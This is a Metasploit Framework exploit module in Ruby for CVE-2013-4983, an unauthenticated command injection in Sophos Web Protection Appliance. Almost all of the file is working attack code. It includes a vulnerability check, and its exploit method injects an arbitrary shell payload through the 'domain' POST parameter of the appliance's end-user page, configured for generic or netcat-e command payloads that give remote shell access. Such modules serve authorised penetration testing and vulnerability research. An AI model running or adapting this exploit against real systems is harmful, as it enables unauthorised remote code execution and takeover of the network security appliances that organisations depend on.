# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Sophos Web Protection Appliance sblistpack Arbitrary Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability on Sophos Web Protection Appliance
        3.7.9, 3.8.0 and 3.8.1. The vulnerability exists on the sblistpack component, reachable
        from the web interface without authentication. This module has been tested successfully
        on Sophos Virtual Web Appliance 3.7.0.
      },
      &#039;Author&#039;         =>
        [
          &#039;Francisco Falcon&#039;, # Vulnerability discovery and PoC
          &#039;juan vazquez&#039;      # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-4983&#039; ],
          [ &#039;OSVDB&#039;, &#039;97029&#039; ],
          [ &#039;BID&#039;, &#039;62263&#039;],
          [ &#039;EDB&#039;, &#039;28175&#039;],
          [ &#039;URL&#039;, &#039;http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "\x27\x22\x5c",
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic netcat-e&#039; # Because quotes and double-quotes aren&#039;t valid
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Sophos Web Protection Appliance 3.7.0&#039;, { }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 06 2013&#039;
      ))

    register_options(
      [
        Opt::RPORT(443)
      ],
      self.class
    )

  end

  def check
    url = "http://www.#{rand_text_alpha(10 + rand(10))}.com"
    domain = "http://#{rand_text_alpha(10 + rand(10))}.com"
    res = send_exploit_query(url, domain)

    if res and res.code == 302 and res.headers.include?(&#039;Location&#039;) and res.headers[&#039;Location&#039;] =~ /#{url}/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("#{rhost}:#{rport} - Executing payload...")
    url = "http://www.#{rand_text_alpha(10 + rand(10))}.com"
    domain = "http://#{rand_text_alpha(10 + rand(10))}.com;#{payload.raw}"
    # very short timeout because the request may never return if we&#039;re
    # sending a socket payload
    send_exploit_query(url, domain, 0.01)
  end

  def send_exploit_query(url, domain, timeout = 20)
    user = rand_text_alpha(8 + rand(5))
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(&#039;end-user&#039;, &#039;index.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => {
        &#039;c&#039; =>&#039;blocked&#039;,
        &#039;action&#039; => &#039;continue&#039;
      },
      &#039;vars_post&#039; => {
        &#039;url&#039;             => "#{Rex::Text.encode_base64(url)}",
        &#039;args_reason&#039;     => rand_text_alpha(15 + rand(5)),
        &#039;filetype&#039;        => rand_text_alpha(15 + rand(5)),
        &#039;user&#039;            => user,
        &#039;user_encoded&#039;    => "#{Rex::Text.encode_base64(user)}",
        &#039;domain&#039;          => domain,
        &#039;raw_category_id&#039; => "#{rand_text_alpha(4 + rand(8))}|#{rand_text_alpha(4 + rand(8))}"
      }
    }, timeout)

    return res
  end

end

